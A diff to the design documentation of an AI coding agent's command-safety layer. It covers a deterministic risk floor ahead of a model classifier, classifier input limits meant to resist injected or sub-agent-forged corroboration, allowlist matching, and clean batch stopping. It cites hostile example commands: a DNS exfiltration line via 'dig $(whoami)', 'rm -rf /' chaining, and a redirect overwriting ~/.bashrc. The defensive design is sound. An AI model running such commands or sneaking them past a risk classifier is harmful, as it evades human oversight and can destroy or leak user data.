@@ -20,7 +20,8 @@ Source:
 
 ### Operator shell escapes
 
-Interactive terminal users can explicitly run a command with `! <command>`. This path runs
+Interactive terminal users can explicitly run a command with `! <command>`; `isShellEscape`
+requires the space, so `!!! urgent` is prose. This path runs
 before the model turn and feeds the bounded result back as tagged command context. It shares
 the shell executor's working-directory resolution, sanitized environment, timeout, interruption
 handling, denylist, and stdout/stderr caps. Because the operator authored the command directly,
@@ -237,6 +238,16 @@ Fail closed: timeouts, provider errors, empty replies, and anything other than t
 token `read-only` or `low-risk` stay `high-risk`. A clearly mutating command stays
 `high-risk` regardless of context.
 
+**The deterministic floor.** `findDeterministicHighRisk` runs first, in
+`resolveCommandRisk`, before a policy plugin or the model is asked; the executor's fallback
+goes through `resolveCommandRisk` too. It lexes the command and returns `high-risk` without a
+model call for an unterminated quote or expansion, command or process substitution, a
+redirection other than discarding to `/dev/null` or duplicating a descriptor, or a command
+word built from an expansion. A small classifier can rate these read-only
+(`dig $(whoami).example.com` exfiltrates through DNS), so no verdict is allowed to lower them.
+The floor is syntax only and holds no program names; what a program does is the classifier's
+and the policy plugin's judgment.
+
 **What the classifier is allowed to read.** The command, always. Plus the last five _user_
 requests (hard-capped at 800 characters) when the session is interactive, so an ambiguous
 command can be lowered only when the person at the keyboard asked for that milder action.
@@ -247,6 +258,9 @@ Two exclusions are deliberate:
   page or a tool result supply its own corroborating evidence.
 - **No conversation at all on a bridge or a headless run.** There the "user" turns come from
   whoever is messaging the bot, and corroboration from a stranger is not corroboration.
+- **No conversation at all inside a sub-agent.** A sub-agent's "user" turn is the task its
+  parent model wrote, so a parent that was talked into something could write the evidence
+  for its child's command.
 
 Both blocks are wrapped as tagged data with `<` escaped, so the model is told not to follow
 instructions inside them and cannot close the tag early. A wrong milder verdict is still
@@ -269,15 +283,25 @@ Tiers are coarse on purpose. When you need precision:
 | **Per-tool allowlist**    | this session | "Always approve this tool": chosen from an approval prompt |
 | **Per-command allowlist** | persisted    | "Always approve this command": `execute_command` only      |
 
-The command allowlist does **not** prefix-match raw strings. It extracts an approval key
-(binary + first subcommand) and matches exactly or on a word boundary:
+The command allowlist does **not** prefix-match raw strings. `extractCommandApprovalKey`
+lexes the command with `parseShellCommandLine`
+([`shell-syntax.ts`](../../packages/core/src/utils/shell-syntax.ts)), which reads quotes,
+escapes, control operators, redirections, assignments and expansions the way bash does. The
+key is the binary plus the next word when that word is not a flag. `isCommandCoveredByAllowlist`
+matches that key exactly or on a word boundary. A command with any shell hazard (control
+operator, substitution, `${...}`, redirection, comment, grouping, leading assignment,
+unterminated quote) has no key and matches nothing:
 
 ```text
 approved: "git status"
   ✅ git status
   ✅ git status --short
   ❌ git statusfoo
-  ❌ git status && rm -rf /     ← the reason prefix matching was rejected
+  ❌ git status && rm -rf /
+  ❌ git status $(rm x)
+  ❌ git status > ~/.bashrc
+  ❌ git -C status rm -rf .     ← keys to "git": an option value is not a subcommand
+  ❌ PAGER=x git status
 ```
 
 The strongest control isn't a policy at all: **an agent whose toolset omits
@@ -297,7 +321,7 @@ flowchart TB
     META --> FORK["Fork all 6 as fibers<br/>≤10 running concurrently"]
     FORK --> JOIN{"Race"}
     JOIN -->|"all complete"| RESULTS(["6 results"])
-    JOIN -->|"interrupt signal<br/>(double-Esc)"| KILL["Interrupt every fiber<br/>settle UI · stop the loop"]
+    JOIN -->|"stopped<br/>(Esc, deadline, --timeout, SIGTERM)"| KILL["Interrupt every fiber<br/>SIGTERM, then SIGKILL, commands<br/>report what each call did"]
 
     classDef act fill:#4f9d9d,stroke:#2f6d6d,color:#ffffff
     class FORK act
@@ -315,10 +339,33 @@ sees it, and the run continues. A tool that can't finish shouldn't take the whol
 Approval prompts are queued rather than raced, and re-checked at dequeue time: a parallel
 tool's "always approve" may have changed the answer while this one waited.
 
-Double-Esc during a running tool is a **clean stop**, not a crash. In-flight tools get a
-cancelled receipt, `execute_command`'s child process is killed, dangling `tool_calls` in
-the transcript get a matching tool-result so the next turn stays valid, and the loop
-exits the same way an LLM-stream interrupt does.
+### Stopping a batch
+
+A batch can be stopped part-way: double-Esc, the run's `maxDurationMs` deadline, `--timeout`,
+or SIGTERM. Each is a **clean stop**, not a crash:
+
+- **Every tool fiber is interrupted, and the interrupt waits for it.** Tool calls are daemon
+  fibers (so Ctrl+B can detach them), and the batch interrupts each one it forked when it is
+  itself interrupted.
+- **Commands get to clean up.** `execute_command` and custom command tools run in their own
+  process group. Stopping one sends SIGTERM to the group, then SIGKILL after
+  `PROCESS_TERMINATION_GRACE_MS` (3s) if it is still running, so a script that traps SIGTERM
+  can finish writing and remove its temp files. The same applies to a tool's own timeout and to
+  the helper processes of `grep`, `find` and the git tools. Only the force path, a second
+  Ctrl+C or SIGTERM, SIGKILLs every command group at once.
+- **Files are never left half-written.** `write_file` and `edit_file` write a sibling temp file
+  and rename it over the target, keeping its permissions and following symlinks; `cp` and `mv`
+  stage the result beside the destination and swap it in, replacing a directory whole. The swap
+  is uninterruptible, so a stop lands before it (nothing changed) or after it (change
+  complete). `mv` across filesystems copies, swaps, and removes the source in that same step.
+- **The report says exactly what ran.** A `ToolBatchLedger` records when each call's side
+  effect begins (after approval, for a tool that asks first) and when it returns. Every call of
+  the stopped batch gets a tool result in the transcript: a completed call keeps its real
+  result, an interrupted one says it may have made part of its changes, and one that never
+  started says it changed nothing. The response carries `stoppedToolCalls` (`completed`,
+  `interrupted`, `not-started` per call), `jazz run --json` includes it in both the success and
+  the failure envelope, and `onToolBatchStopped` tells a caller whose run was interrupted from
+  outside.
 
 ---
 
